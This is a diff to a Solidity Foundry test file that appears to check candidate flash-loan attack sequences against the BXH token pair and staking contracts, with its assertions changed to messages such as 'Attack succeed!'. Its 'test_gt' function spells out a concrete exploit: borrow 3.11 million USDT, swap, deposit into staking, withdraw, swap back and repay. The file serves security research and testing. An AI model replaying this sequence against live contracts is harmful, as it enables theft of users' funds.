@@ -232,7 +232,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_attacker_usdt_bxh(amt1, amt2);
         swap_pair_attacker_bxh_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -250,7 +250,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_attacker_bxh_usdt(amt1, amt2);
         swap_pair_attacker_usdt_bxh(amt3, amt4);
         payback_bxh_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -269,7 +269,7 @@ contract BXHTest is Test, BlockLoader {
         deposit_bxhstaking_bxh_bxhslp(amt3);
         withdraw_bxhstaking_bxhslp_usdt(amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -293,7 +293,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt5);
         payback_usdt_pair(amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -317,7 +317,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt5);
         payback_bxh_pair(amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -339,7 +339,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_attacker_usdt_bxh(amt4, amt5);
         withdraw_bxhstaking_bxhslp_usdt(amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -361,7 +361,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_attacker_bxh_usdt(amt4, amt5);
         withdraw_bxhstaking_bxhslp_usdt(amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -383,7 +383,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt4);
         swap_pair_attacker_bxh_usdt(amt5, amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -402,7 +402,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt2);
         swap_pair_attacker_usdt_bxh(amt3, amt4);
         payback_bxh_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -426,7 +426,7 @@ contract BXHTest is Test, BlockLoader {
         payback_usdt_pair(amt4);
         swap_pair_attacker_usdt_bxh(amt5, amt6);
         payback_bxh_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -450,7 +450,7 @@ contract BXHTest is Test, BlockLoader {
         payback_bxh_pair(amt4);
         swap_pair_attacker_usdt_bxh(amt5, amt6);
         payback_bxh_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -472,7 +472,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt4);
         swap_pair_attacker_usdt_bxh(amt5, amt6);
         payback_bxh_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -494,7 +494,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt4);
         swap_pair_attacker_usdt_bxh(amt5, amt6);
         payback_bxh_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -518,7 +518,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_attacker_usdt_bxh(amt5, amt6);
         swap_pair_attacker_bxh_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -542,7 +542,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_attacker_bxh_usdt(amt5, amt6);
         swap_pair_attacker_usdt_bxh(amt7, amt8);
         payback_bxh_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -567,7 +567,7 @@ contract BXHTest is Test, BlockLoader {
         deposit_bxhstaking_bxh_bxhslp(amt7);
         withdraw_bxhstaking_bxhslp_usdt(amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -592,7 +592,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_attacker_usdt_bxh(amt5, amt6);
         swap_pair_attacker_bxh_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -617,7 +617,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt6);
         swap_pair_attacker_usdt_bxh(amt7, amt8);
         payback_bxh_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -642,7 +642,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_attacker_bxh_usdt(amt5, amt6);
         swap_pair_attacker_usdt_bxh(amt7, amt8);
         payback_bxh_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -668,7 +668,7 @@ contract BXHTest is Test, BlockLoader {
         deposit_bxhstaking_bxh_bxhslp(amt7);
         withdraw_bxhstaking_bxhslp_usdt(amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -699,7 +699,7 @@ contract BXHTest is Test, BlockLoader {
         deposit_bxhstaking_bxh_bxhslp(amt9);
         withdraw_bxhstaking_bxhslp_usdt(amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -730,7 +730,7 @@ contract BXHTest is Test, BlockLoader {
         deposit_bxhstaking_bxh_bxhslp(amt9);
         withdraw_bxhstaking_bxhslp_usdt(amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -759,7 +759,7 @@ contract BXHTest is Test, BlockLoader {
         deposit_bxhstaking_bxh_bxhslp(amt9);
         withdraw_bxhstaking_bxhslp_usdt(amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -788,7 +788,7 @@ contract BXHTest is Test, BlockLoader {
         deposit_bxhstaking_bxh_bxhslp(amt9);
         withdraw_bxhstaking_bxhslp_usdt(amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -819,7 +819,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt9);
         payback_usdt_pair(amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -850,7 +850,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt9);
         payback_bxh_pair(amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -879,7 +879,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_attacker_usdt_bxh(amt8, amt9);
         withdraw_bxhstaking_bxhslp_usdt(amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -908,7 +908,7 @@ contract BXHTest is Test, BlockLoader {
         swap_pair_attacker_bxh_usdt(amt8, amt9);
         withdraw_bxhstaking_bxhslp_usdt(amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -937,7 +937,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt8);
         swap_pair_attacker_bxh_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -963,7 +963,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt6);
         swap_pair_attacker_usdt_bxh(amt7, amt8);
         payback_bxh_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -994,7 +994,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt8);
         swap_pair_attacker_usdt_bxh(amt9, amt10);
         payback_bxh_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1025,7 +1025,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt8);
         swap_pair_attacker_usdt_bxh(amt9, amt10);
         payback_bxh_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1054,7 +1054,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt8);
         swap_pair_attacker_usdt_bxh(amt9, amt10);
         payback_bxh_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1083,7 +1083,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt8);
         swap_pair_attacker_usdt_bxh(amt9, amt10);
         payback_bxh_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1114,7 +1114,7 @@ contract BXHTest is Test, BlockLoader {
         payback_usdt_pair(amt8);
         swap_pair_attacker_usdt_bxh(amt9, amt10);
         payback_bxh_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1145,7 +1145,7 @@ contract BXHTest is Test, BlockLoader {
         payback_bxh_pair(amt8);
         swap_pair_attacker_usdt_bxh(amt9, amt10);
         payback_bxh_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1174,7 +1174,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt8);
         swap_pair_attacker_usdt_bxh(amt9, amt10);
         payback_bxh_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1203,28 +1203,42 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt8);
         swap_pair_attacker_usdt_bxh(amt9, amt10);
         payback_bxh_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 3110000e18);
         borrow_usdt_owner(3110000e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", 3110000e18);
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(3110000e18, address(usdt))
+        );
         swap_pair_attacker_usdt_bxh(
             3110000e18,
             pair.getAmountOut(3110000e18, address(usdt))
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", 5582e18);
         deposit_bxhstaking_bxh_bxhslp(5582e18);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", 0);
         withdraw_bxhstaking_bxhslp_usdt(0);
         printBalance("After step3 ");
+        emit log_named_uint("amt5", bxh.balanceOf(attacker));
+        emit log_named_uint(
+            "amt6",
+            pair.getAmountOut(bxh.balanceOf(attacker), address(bxh))
+        );
         swap_pair_attacker_bxh_usdt(
             bxh.balanceOf(attacker),
             pair.getAmountOut(bxh.balanceOf(attacker), address(bxh))
         );
         printBalance("After step4 ");
+        emit log_named_uint("amt7", (3110000e18 * 1003) / 1000);
         payback_usdt_owner((3110000e18 * 1003) / 1000);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
@@ -1249,7 +1263,7 @@ contract BXHTest is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt4);
         swap_pair_attacker_bxh_usdt(amt5, amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
